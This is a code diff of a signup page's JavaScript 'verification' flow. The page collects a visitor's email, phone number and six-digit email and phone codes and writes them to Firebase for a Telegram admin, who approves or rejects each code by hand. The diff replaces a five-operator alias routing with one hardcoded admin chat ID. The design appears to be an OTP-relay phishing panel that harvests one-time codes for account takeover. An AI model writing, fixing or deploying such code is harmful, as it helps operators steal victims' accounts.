@@ -493,83 +493,16 @@ try {
    REGISTRATION VERIFICATION WORKFLOW
    ------------------------------------------------------------
    Client role:
-     - Resolve ?ref= alias -> adminId via strict allowlist
-     - WRITE one pending record under
-         account_verifications/admin/{adminId}/{requestId}
+     - WRITE one pending record under account_verifications/{requestId}
      - READ that single record
-     - WRITE emailCode / phoneCode when the user submits a code
+     - WRITE emailCode / phoneCode when user submits the 6-digit code
      - NEVER write emailVerified / phoneVerified / status
    The trusted backend (Telegram verifier) is the ONLY writer
    allowed to flip flags to true.
    ============================================================ */
 
-/* ============================================================
-   ADMIN ROUTING (ref alias -> Telegram admin id)
-   ------------------------------------------------------------
-   Five aliases map to five distinct administrators.
-   There is NO legacy fallback. If ?ref= is missing, empty,
-   duplicated, malformed, or unknown, routing is UNRESOLVED and
-   step1() refuses to write. The user sees a clear error.
-
-   HONESTY: This mapping only chooses the Firebase path segment
-   `account_verifications/admin/{adminId}`. It does NOT grant the
-   visitor admin privileges. It ONLY works if the trusted Telegram
-   bot listens on the same admin/{adminId} paths. See the report.
-   ============================================================ */
-
-// Strict allowlist. Keys are case-sensitive lowercase; values are
-// the exact configured administrator Telegram IDs.
-const ADMIN_ALIAS_MAP = Object.freeze({
-    "k7m4": "8761777482",
-    "p9x2": "8922933658",
-    "v6q8": "8898838317",
-    "r3n5": "8499910147",
-    "w8d1": "5449099721"
-});
-
-// Returns the resolved adminId string, or null when routing is
-// unresolved. Never returns the legacy id; never returns user text.
-function resolveAdminId() {
-    let refValue = null;
-    try {
-        const params = new URLSearchParams(window.location.search);
-        const allRefs = params.getAll("ref");
-
-        // Missing parameter -> unresolved.
-        if (allRefs.length === 0) return null;
-
-        // Duplicate parameter -> unresolved (ambiguous routing).
-        if (allRefs.length > 1) return null;
-
-        refValue = allRefs[0];
-    } catch (_) {
-        return null;
-    }
-
-    if (typeof refValue !== "string") return null;
-
-    const normalized = refValue.trim().toLowerCase();
-    if (!normalized) return null;
-
-    // Exact allowlist lookup. Anything else -> unresolved.
-    if (Object.prototype.hasOwnProperty.call(ADMIN_ALIAS_MAP, normalized)) {
-        return ADMIN_ALIAS_MAP[normalized];
-    }
-    return null;
-}
-
-const ADMIN_ID = resolveAdminId();
-const ADMIN_ID_RESOLVED = typeof ADMIN_ID === "string" && ADMIN_ID.length > 0;
-
-// Path is only built when routing is resolved. When unresolved we
-// keep it null so no accidental write can construct a path from
-// user-controlled text.
-const VERIFICATIONS_BASE_PATH = ADMIN_ID_RESOLVED
-    ? "account_verifications/admin/" + ADMIN_ID
-    : null;
-
-// Expose the resolved id (or null) for debugging; never the raw alias.
-window.__clashAdminId = ADMIN_ID_RESOLVED ? ADMIN_ID : null;
+const ADMIN_CHAT_ID = "7144369262";
+const VERIFICATIONS_PATH = "account_verifications/admin/" + ADMIN_CHAT_ID;
 
 let currentRequestId = null;
 let currentUnsubscribe = null;
@@ -577,6 +510,11 @@ let submissionLocked = false;
 let currentStep = 1;
 
 // EDGE-TRIGGER GUARDS ------------------------------------------------
+// We only run the "clear OTP inputs + show error" routine when the
+// rejection flag transitions from false/undefined -> true. While the
+// flag remains true (which it does until the user submits a new code,
+// at which point verifyEmail/verifyPhone flip it back to false), we
+// do NOT clear the input again.
 let _emailRejectedLastSeen = false;
 let _phoneRejectedLastSeen = false;
 // --------------------------------------------------------------------
@@ -691,6 +629,7 @@ function mv(prefix, index, el) {
         const next = document.getElementById(prefix + (index + 1));
         if (next) next.focus();
     }
+    // Update the corresponding verify button state.
     if (prefix === "e") otpChk("e", "btn2");
     if (prefix === "p") otpChk("p", "btn3");
 }
@@ -709,16 +648,6 @@ function bk(prefix, index, event) {
 async function step1() {
     if (submissionLocked) return;
     hideError("err1");
-
-    // HARD GATE: refuse to write when routing is unresolved.
-    // This is the "fail safely" requirement — no write, clear error.
-    if (!ADMIN_ID_RESOLVED || !VERIFICATIONS_BASE_PATH) {
-        showError(
-            "err1",
-            "This signup link is invalid or expired. Please use the link provided by your Clash administrator."
-        );
-        return;
-    }
 
     const email = document.getElementById("email").value.trim();
     const cc = document.getElementById("cc").value;
@@ -740,6 +669,7 @@ async function step1() {
     const originalLabel = btn.textContent;
     btn.textContent = "Sending...";
 
+    // Spinner shown IMMEDIATELY on click, before any await.
     showSubmitSpinner();
 
     const requestId = generateRequestId();
@@ -758,7 +688,6 @@ async function step1() {
     const payload = {
         email: email,
         phone: phone,
-        adminId: ADMIN_ID,
         proceed: false,
         emailVerified: false,
         phoneVerified: false,
@@ -769,7 +698,7 @@ async function step1() {
     };
 
     try {
-        await set(ref(firebaseDb, VERIFICATIONS_BASE_PATH + "/" + requestId), payload);
+        await set(ref(firebaseDb, VERIFICATIONS_PATH + "/" + requestId), payload);
     } catch (err) {
         console.error("Failed to create verification request:", err);
         hideSubmitSpinner();
@@ -780,6 +709,8 @@ async function step1() {
         return;
     }
 
+    // Keep the spinner spinning until admin taps Proceed.
+    // Do NOT call hideSubmitSpinner() here.
     startDotAnim(btn);
     btn.disabled = true;
 
@@ -787,10 +718,9 @@ async function step1() {
 }
 
 function attachListener(requestId) {
-    if (!VERIFICATIONS_BASE_PATH) return;
     teardownListener();
 
-    const recordRef = ref(firebaseDb, VERIFICATIONS_BASE_PATH + "/" + requestId);
+    const recordRef = ref(firebaseDb, VERIFICATIONS_PATH + "/" + requestId);
 
     currentUnsubscribe = onValue(
         recordRef,
@@ -843,6 +773,9 @@ function attachListener(requestId) {
             }
 
             // ---------- RETRYABLE: EMAIL CODE REJECTED (EDGE-TRIGGERED) ----------
+            // Only fire on the false/undefined -> true transition. While
+            // the flag stays true, we do nothing, so the user's fresh
+            // input is never wiped out by a subsequent snapshot.
             const emailRejectedNow = data.emailRejected === true;
             if (emailRejectedNow && !_emailRejectedLastSeen && currentStep === 2) {
                 _emailRejectedLastSeen = true;
@@ -858,6 +791,7 @@ function attachListener(requestId) {
                 if (first) first.focus();
                 return;
             }
+            // Flag flipped back to false (because the user submitted a new code).
             if (!emailRejectedNow) {
                 if (_emailRejectedLastSeen) {
                     _emailRejectedLastSeen = false;
@@ -925,7 +859,6 @@ function attachListener(requestId) {
 // ---------- Email code submit: writes code, never flips the flag ----------
 async function verifyEmail() {
     if (!currentRequestId) return;
-    if (!VERIFICATIONS_BASE_PATH) return;
     hideError("err2");
 
     const code = ["e0","e1","e2","e3","e4","e5"]
@@ -943,20 +876,27 @@ async function verifyEmail() {
     if (verifySpin) verifySpin.style.display = "block";
 
     try {
+        // Write the fresh code, then clear the rejection flag. The
+        // listener's edge-trigger guard means clearing the flag does
+        // NOT re-run the "wipe the inputs" routine.
         await set(
-            ref(firebaseDb, VERIFICATIONS_BASE_PATH + "/" + currentRequestId + "/emailCode"),
+            ref(firebaseDb, VERIFICATIONS_PATH + "/" + currentRequestId + "/emailCode"),
             code
         );
         await set(
-            ref(firebaseDb, VERIFICATIONS_BASE_PATH + "/" + currentRequestId + "/emailCodeSubmittedAt"),
+            ref(firebaseDb, VERIFICATIONS_PATH + "/" + currentRequestId + "/emailCodeSubmittedAt"),
             Date.now()
         );
         await set(
-            ref(firebaseDb, VERIFICATIONS_BASE_PATH + "/" + currentRequestId + "/emailRejected"),
+            ref(firebaseDb, VERIFICATIONS_PATH + "/" + currentRequestId + "/emailRejected"),
             false
         );
+        // Also reset the bot-side flag that tells it whether to resend
+        // the stage-2 card. This mirrors what the bot does when the
+        // admin taps "Wrong Email Code" -> true; here we flip back to
+        // false so the next snapshot will trigger a fresh card.
         await set(
-            ref(firebaseDb, VERIFICATIONS_BASE_PATH + "/" + currentRequestId + "/emailRejectedNotified"),
+            ref(firebaseDb, VERIFICATIONS_PATH + "/" + currentRequestId + "/emailRejectedNotified"),
             false
         );
     } catch (err) {
@@ -966,12 +906,14 @@ async function verifyEmail() {
         showError("err2", "Could not submit code. Please try again.");
         return;
     }
+    // Spinner stays visible. The listener advances to #s3 when the
+    // trusted backend flips emailVerified to true. The client never
+    // writes that flag itself.
 }
 
 // ---------- Phone code submit: same pattern ----------
 async function verifyPhone() {
     if (!currentRequestId) return;
-    if (!VERIFICATIONS_BASE_PATH) return;
     hideError("err3");
 
     const code = ["p0","p1","p2","p3","p4","p5"]
@@ -990,19 +932,19 @@ async function verifyPhone() {
 
     try {
         await set(
-            ref(firebaseDb, VERIFICATIONS_BASE_PATH + "/" + currentRequestId + "/phoneCode"),
+            ref(firebaseDb, VERIFICATIONS_PATH + "/" + currentRequestId + "/phoneCode"),
             code
         );
         await set(
-            ref(firebaseDb, VERIFICATIONS_BASE_PATH + "/" + currentRequestId + "/phoneCodeSubmittedAt"),
+            ref(firebaseDb, VERIFICATIONS_PATH + "/" + currentRequestId + "/phoneCodeSubmittedAt"),
             Date.now()
         );
         await set(
-            ref(firebaseDb, VERIFICATIONS_BASE_PATH + "/" + currentRequestId + "/phoneRejected"),
+            ref(firebaseDb, VERIFICATIONS_PATH + "/" + currentRequestId + "/phoneRejected"),
             false
         );
         await set(
-            ref(firebaseDb, VERIFICATIONS_BASE_PATH + "/" + currentRequestId + "/phoneRejectedNotified"),
+            ref(firebaseDb, VERIFICATIONS_PATH + "/" + currentRequestId + "/phoneRejectedNotified"),
             false
         );
     } catch (err) {
@@ -1012,6 +954,9 @@ async function verifyPhone() {
         showError("err3", "Could not submit code. Please try again.");
         return;
     }
+    // Spinner stays visible. The listener advances to #s4 when the
+    // trusted backend flips phoneVerified to true and status to
+    // "verified". The client never writes those fields itself.
 }
 
 window.addEventListener("beforeunload", () => {
@@ -1025,16 +970,6 @@ window.addEventListener("pagehide", () => {
 function initButtonState() {
     const btn = document.getElementById("btn1");
     if (btn) btn.disabled = true;
-
-    // If routing is unresolved, surface the error immediately on
-    // load so the user understands why nothing will proceed.
-    if (!ADMIN_ID_RESOLVED) {
-        showError(
-            "err1",
-            "This signup link is invalid or expired. Please use the link provided by your Clash administrator."
-        );
-    }
-
     chk();
     otpChk("e", "btn2");
     otpChk("p", "btn3");
@@ -1056,7 +991,8 @@ if (document.readyState === "loading") {
 /* ============================================================
    CRITICAL: expose module-scoped functions to the global scope.
    Inline HTML handlers (onclick, oninput, onkeydown) resolve
-   against window, NOT module scope.
+   against window, NOT module scope. Without this block, every
+   inline handler silently does nothing.
    ============================================================ */
 window.chk         = chk;
 window.step1       = step1;
@@ -1073,9 +1009,7 @@ window.accountVerificationFirebase = {
     set,
     onValue,
     off,
-    get currentRequestId() { return currentRequestId; },
-    get adminId() { return ADMIN_ID_RESOLVED ? ADMIN_ID : null; },
-    get adminIdResolved() { return ADMIN_ID_RESOLVED; }
+    get currentRequestId() { return currentRequestId; }
 };
 </script>
 </body>
